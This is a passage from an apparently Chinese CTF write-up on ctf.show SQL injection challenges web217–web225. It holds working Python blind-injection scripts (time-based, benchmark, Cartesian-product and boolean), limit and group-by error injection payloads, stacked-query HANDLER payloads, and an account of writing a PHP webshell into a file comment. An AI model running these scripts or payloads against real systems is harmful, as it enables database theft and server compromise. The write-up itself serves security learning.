function">sleep</span><span class="token punctuation">(</span><span class="token number">1.5</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="web217"><a href="#web217" class="headerlink" title="web217"></a>web217</h1><p>关于benchmark函数，他会造成一个简单的时间延迟，同时网上还流传利用benchmark函数进行ddos攻击，是想让数据库超负荷，也算是比较新鲜的一个函数，比较好理解</p><p><strong><a href="https://blog.csdn.net/weixin_36276175/article/details/113295236" target="_blank" rel="noopener">MySQL中benchmark_MYSQL中BENCHMARK函数的利用</a></strong></p><p><strong>关键语句</strong></p><pre class="line-numbers language-python"><code class="language-python">data <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">'ip'</span><span class="token punctuation">:</span> f<span class="token string">"1) or if(ascii(substr(({payload}),{i},1))>{mid},benchmark(100000,md5(1)),1"</span><span class="token punctuation">,</span>            <span class="token string">'debug'</span><span class="token punctuation">:</span><span class="token string">'0'</span>        <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h1 id="web218"><a href="#web218" class="headerlink" title="web218"></a>web218</h1><p><a href="https://www.cnblogs.com/forforever/p/13019703.html" target="_blank" rel="noopener">MySQL时间盲注五种延时方法</a></p><pre class="line-numbers language-mysql"><code class="language-mysql"> 笛卡尔积（多表联合查询）(因为连接表是一个很耗时的操作)     AxB=A和B中每个元素的组合所组成的集合，就是连接表     SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C;     select * from table_name A, table_name B     select * from table_name A, table_name B，table_name C     select count(*) from table_name A, table_name B，table_name C  表可以是同一张表<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>重点在很耗时，所以说可以利用这一点特性，将多表联合查询放在原来sleep的位置，就可以同样有睡眠的效果</p><p><strong>脚本</strong></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> sys<span class="token keyword">import</span> timeurl<span class="token operator">=</span><span class="token string">"http://6b39c9d3-3c24-432b-abfd-735534f0e5cf.challenge.ctf.show:8080/api/"</span>letter<span class="token operator">=</span><span class="token string">"0123456789abcdefghijklmnopqrstuvwxyz-,{_}"</span> <span class="token comment" spellcheck="true">#最后跑flag时去掉"_"</span>flag<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> letter<span class="token punctuation">:</span>        <span class="token comment" spellcheck="true">#payload="1) or if((select group_concat(table_name) from information_schema.tables where table_schema=database()) like '{}%',(select count(*) from information_schema.columns A, information_schema.columns B),0)-- -".format(flag+j)</span>        <span class="token comment" spellcheck="true">#payload="1) or if((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxc') like '{}%',(select count(*) from information_schema.columns A, information_schema.columns B),0) -- +".format(flag+j)</span>        payload<span class="token operator">=</span><span class="token string">"1) or if((select group_concat(flagaac) from ctfshow_flagxc) like '{}%',(select count(*) from information_schema.columns A, information_schema.columns B),0)-- -"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>flag<span class="token operator">+</span>j<span class="token punctuation">)</span>        data<span class="token operator">=</span><span class="token punctuation">{</span>                 <span class="token string">'ip'</span><span class="token punctuation">:</span>payload<span class="token punctuation">,</span>            <span class="token string">'debug'</span><span class="token punctuation">:</span><span class="token number">0</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">#print(res)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">0.15</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text        <span class="token keyword">except</span><span class="token punctuation">:</span>            flag<span class="token operator">+=</span>j            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>             <span class="token keyword">break</span>              <span class="token keyword">if</span> <span class="token string">"}"</span> <span class="token operator">==</span> j<span class="token punctuation">:</span>            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.2</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#遍历letter中一个字符就停止0.2s      </span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.2</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">#正确匹配到一个字符就停止1s</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="web219-web220"><a href="#web219-web220" class="headerlink" title="web219-web220"></a>web219-web220</h1><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> sys<span class="token keyword">import</span> timeurl<span class="token operator">=</span><span class="token string">"/api/index.php"</span>letter<span class="token operator">=</span><span class="token string">"0123456789abcdefghijklmnopqrstuvwxyz-,{}"</span> <span class="token comment" spellcheck="true">#最后跑flag时去掉"_"</span>flag<span class="token operator">=</span><span class="token string">"ctfshow{45835205-bd93-40ff-9d71-"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> letter<span class="token punctuation">:</span>                <span class="token comment" spellcheck="true">#payload="1) or if((table_name from information_schema.tables where table_schema=database() limit 0,1) like '{}%',(SELECT count(*) FROM information_schema.tables A, information_schema.schemata B, information_schema.schemata D, information_schema.schemata E, information_schema.schemata F,information_schema.schemata G, information_schema.schemata H,information_schema.schemata I),1)-- -".format(flag+j)</span>        <span class="token comment" spellcheck="true">#payload="1) or if((select column_name from information_schema.columns where table_name='ctfshow_flagxcac') like '{}%',(SELECT count(*) FROM information_schema.tables A, information_schema.schemata B, information_schema.schemata D, information_schema.schemata E, information_schema.schemata F,information_schema.schemata G, information_schema.schemata H,information_schema.schemata I),0) -- +".format(flag+j)</span>        payload<span class="token operator">=</span><span class="token string">"1) or if((select flagaabcc from ctfshow_flagxcac) like '{}%',(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),1)-- -"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>flag<span class="token operator">+</span>j<span class="token punctuation">)</span>        data<span class="token operator">=</span><span class="token punctuation">{</span>                 <span class="token string">'ip'</span><span class="token punctuation">:</span>payload<span class="token punctuation">,</span>             <span class="token string">'debug'</span><span class="token punctuation">:</span><span class="token number">0</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">#print(payload)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">0.15</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text        <span class="token keyword">except</span><span class="token punctuation">:</span>            flag<span class="token operator">+=</span>j            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>             <span class="token keyword">break</span>              <span class="token keyword">if</span> <span class="token string">"}"</span> <span class="token operator">==</span> j<span class="token punctuation">:</span>            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#print(res)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#遍历letter中一个字符就停止1s      </span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">#正确匹配到一个字符就停止1s</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="web221——Limit注入"><a href="#web221——Limit注入" class="headerlink" title="web221——Limit注入"></a>web221——Limit注入</h1><p><a href="https://www.jianshu.com/p/6c1420a7a7d9" target="_blank" rel="noopener">Mysql 注入之 limit 注入</a></p><p><strong>查询语句</strong></p><pre class="line-numbers language-php"><code class="language-php">  <span class="token comment" spellcheck="true">//分页查询</span>  <span class="token variable">$sql</span> <span class="token operator">=</span> select <span class="token operator">*</span> from ctfshow_user <span class="token function">limit</span> <span class="token punctuation">(</span><span class="token variable">$page</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token variable">$limit</span><span class="token punctuation">,</span><span class="token variable">$limit</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>返回逻辑</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//TODO:很安全，不需要过滤</span><span class="token comment" spellcheck="true">//拿到数据库名字就算你赢</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>按照链接的做法：</strong></p><pre class="line-numbers language-mysql"><code class="language-mysql">extractvalue(目标xml文档，xml路径):对XML文档进行查询的函数?page=1&limit=7 procedure analyse(extractvalue(1,concat(666,database(),666)),1)updatexml(目标xml文档，xml路径，更新的内容):更新xml文档的函数?page=1&limit=7 procedure analyse(updatexml(1,concat(0x7e,database(),0x7e),1),1)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="web222——group-by-注入"><a href="#web222——group-by-注入" class="headerlink" title="web222——group by 注入"></a>web222——group by 注入</h1><p><strong>查询语句</strong></p><pre class="line-numbers language-php"><code class="language-php">  <span class="token comment" spellcheck="true">//分页查询</span>  <span class="token variable">$sql</span> <span class="token operator">=</span> select <span class="token operator">*</span> from ctfshow_user group by <span class="token variable">$username</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><a href="https://www.secpulse.com/archives/140616.html" target="_blank" rel="noopener">floor()报错注入</a></p><p><a href="https://www.cnblogs.com/02SWD/p/CTF-sql-group_by.html" target="_blank" rel="noopener">CTF-sql-group by报错注入</a></p><p>y4的脚本</p><pre class="line-numbers language-python"><code class="language-python"><span class="token triple-quoted-string string">"""Author:Y4tacker"""</span><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://6119f221-08cd-4363-88d4-1809bd590024.chall.ctf.show/api/"</span>result <span class="token operator">=</span> <span class="token string">""</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        <span class="token comment" spellcheck="true"># 查数据库</span>        <span class="token comment" spellcheck="true"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>        <span class="token comment" spellcheck="true"># 查列名字</span>        <span class="token comment" spellcheck="true"># payload = "select column_name from information_schema.columns where table_name='ctfshow_flaga' limit 1,1"</span>        <span class="token comment" spellcheck="true"># 查数据---不能一次查完越到后面越不准确</span>        payload <span class="token operator">=</span> <span class="token string">"select flagaabc from ctfshow_flaga"</span>        <span class="token comment" spellcheck="true"># flag{b747hfb7-P8e8-</span>        params <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">'u'</span><span class="token punctuation">:</span> f<span class="token string">"concat((if (ascii(substr(({payload}),{i},1))>{mid}, sleep(0.05), 2)), 1);"</span>        <span class="token punctuation">}</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span>params<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>            tail <span class="token operator">=</span> mid        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        result <span class="token operator">+=</span> chr<span class="token punctuation">(</span>head<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此处用sleep代替了floor</p><h1 id="web223"><a href="#web223" class="headerlink" title="web223"></a>web223</h1><p><strong>查询语句</strong></p><pre class="line-numbers language-php"><code class="language-php">  <span class="token comment" spellcheck="true">//分页查询</span>  <span class="token variable">$sql</span> <span class="token operator">=</span> select <span class="token operator">*</span> from ctfshow_user group by <span class="token variable">$username</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>返回逻辑</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//TODO:很安全，不需要过滤</span><span class="token comment" spellcheck="true">//用户名不能是数字</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>利用原理</strong></p><pre class="line-numbers language-mysql"><code class="language-mysql">?u=if('a'='a',username,'a')?u=if('a'='b',username,'a')<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>脚本</strong></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">def</span> <span class="token function">generateNum</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> <span class="token string">'true'</span>    <span class="token keyword">if</span> num <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> res    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>num <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            res <span class="token operator">+=</span> <span class="token string">"+true"</span>        <span class="token keyword">return</span> resurl <span class="token operator">=</span> <span class="token string">"http://ff765902-0dec-4688-8cd2-1a4cc429d30a.chall.ctf.show/api/"</span>i <span class="token operator">=</span> <span class="token number">0</span>res <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        <span class="token comment" spellcheck="true"># 查数据库-ctfshow_flagas</span>        <span class="token comment" spellcheck="true"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>        <span class="token comment" spellcheck="true"># 查字段-flagasabc</span>        <span class="token comment" spellcheck="true"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagas'"</span>        <span class="token comment" spellcheck="true"># 查flag</span>        payload <span class="token operator">=</span> <span class="token string">"select flagasabc from ctfshow_flagas"</span>        params <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">"u"</span><span class="token punctuation">:</span> f<span class="token string">"if(ascii(substr(({payload}),{generateNum(i)},{generateNum(1)}))>{generateNum(mid)},username,'a')"</span>        <span class="token punctuation">}</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span>params<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># print(r.json()['data'])</span>        <span class="token keyword">if</span> <span class="token string">"userAUTO"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            tail <span class="token operator">=</span> mid    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        res <span class="token operator">+=</span> chr<span class="token punctuation">(</span>head<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>主要通过生成数字的函数，就原有的脚本进行了数字编码</p><h1 id="web224"><a href="#web224" class="headerlink" title="web224"></a>web224</h1><p><strong>/robots.txt：</strong></p><pre class="line-numbers language-php"><code class="language-php">User<span class="token operator">-</span>agent<span class="token punctuation">:</span> <span class="token operator">*</span>Disallow<span class="token punctuation">:</span> <span class="token operator">/</span>pwdreset<span class="token punctuation">.</span>php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210816173211309.png" alt></p><p>登陆后是文件上传，经过测试任何文件都无法上传</p><p><a href="https://www.gem-love.com/ctf/2283.html#你没见过的注入" target="_blank" rel="noopener">你没见过的注入</a>经过这篇文章介绍，应该是需要修改文件的comments是我用的群里面的payload.bin文件</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210816183907366.png" alt></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210816184141602.png" alt></p><p>这里的16进制为一句话木马，很有可能是原来的语句中，有一个解析comment的环节，正好到了这个环节也就中招了，括号被闭合，木马成功写入</p><p>getshell后读取upload.php</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"error"</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Return Code: "</span> <span class="token punctuation">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"error"</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">"&lt;br />"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"size"</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token number">10</span><span class="token operator">*</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"文件过大: "</span> <span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"size"</span><span class="token punctuation">]</span> <span class="token operator">/</span> <span class="token number">1024</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">" Kb&lt;br />"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token string">"upload/"</span> <span class="token punctuation">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token punctuation">{</span>      <span class="token keyword">echo</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">" already exists. "</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token keyword">else</span>      <span class="token punctuation">{</span>      <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">".zip"</span><span class="token punctuation">;</span>      <span class="token variable">$filetype</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">finfo</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/image|png|bmap|jpg|jpeg|application|text|audio|video/i"</span><span class="token punctuation">,</span><span class="token variable">$filetype</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"file type error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token variable">$filepath</span> <span class="token operator">=</span> <span class="token string">"upload/"</span><span class="token punctuation">.</span><span class="token variable">$filename</span><span class="token punctuation">;</span>      <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"INSERT INTO file(filename,filepath,filetype) VALUES ('"</span><span class="token punctuation">.</span><span class="token variable">$filename</span><span class="token punctuation">.</span><span class="token string">"','"</span><span class="token punctuation">.</span><span class="token variable">$filepath</span><span class="token punctuation">.</span><span class="token string">"','"</span><span class="token punctuation">.</span><span class="token variable">$filetype</span><span class="token punctuation">.</span><span class="token string">"');"</span><span class="token punctuation">;</span>      <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>      <span class="token string">"upload/"</span> <span class="token punctuation">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token variable">$con</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string">"localhost"</span><span class="token punctuation">,</span><span class="token string">"root"</span><span class="token punctuation">,</span><span class="token string">"root"</span><span class="token punctuation">,</span><span class="token string">"ctf"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$con</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Could not connect: '</span> <span class="token punctuation">.</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mysqli_multi_query</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"location:filelist.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"Error: "</span> <span class="token punctuation">.</span> <span class="token variable">$sql</span> <span class="token punctuation">.</span> <span class="token string">"&lt;br>"</span> <span class="token punctuation">.</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>印证猜想，其中关键在filetype的解析环节导致了comment里面的内容被读取并写入，这在给出的文章中也有提到，相信仔细看的人都会发现：是因为finfo的缘故</p><h1 id="web225——Handler、预处理"><a href="#web225——Handler、预处理" class="headerlink" title="web225——Handler、预处理"></a>web225——<code>Handler、预处理</code></h1><p><a href="https://blog.csdn.net/solitudi/article/details/107823398?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160652999219721940215459%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=160652999219721940215459&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_blog_default-1-107823398.pc_v2_rank_blog_default&utm_term=%E5%BC%BA%E7%BD%91%E6%9D%AF&spm=1018.2118.3001.4450" target="_blank" rel="noopener">必看链接</a></p><p><strong>查询语句</strong></p><pre class="line-numbers language-php"><code class="language-php">  <span class="token comment" spellcheck="true">//分页查询</span>  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select id,username,pass from ctfshow_user where username = '{$username}';"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>返回逻辑</strong></p><pre class="line-numbers language-php"><code class="language-php">  <span class="token comment" spellcheck="true">//师傅说过滤的越多越好</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/file|into|dump|union|select|update|delete|alter|drop|create|describe|set/i'</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>方法一——Handler</strong></p><p>mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。</p><pre class="line-numbers language-mysql"><code class="language-mysql">/api/?username=';show tables;-- -/api/?username=';handler `ctfshow_flagasa` open;handler `ctfshow_flagasa` read first;-- -<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>HANDLER … OPEN语句打开一个表，使其可以使用后续HANDLER … READ语句访问，该表对象未被其他会话共享，并且在会话调用HANDLER … 